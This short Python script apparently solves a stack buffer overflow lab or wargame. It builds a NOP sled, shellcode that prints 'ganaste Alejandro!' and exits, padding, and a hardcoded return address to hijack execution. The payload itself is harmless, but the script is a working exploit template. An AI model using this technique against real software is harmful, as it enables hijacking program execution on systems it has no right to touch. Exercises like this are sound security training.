from struct import pack

shellcode = "\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x13\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xea\xff\xff\xff\x67\x61\x6e\x61\x73\x74\x65\x20\x41\x6c\x65\x6a\x61\x6e\x64\x72\x6f\x21\x0b"
ret_addr = 0xbffff5c4

output = "\x90" * 20
output += shellcode
output += "A" * (80 - 20 - len(shellcode))
output += "BBBB"
output += "CCCC"
output += pack("<I", ret_addr)

print(output)


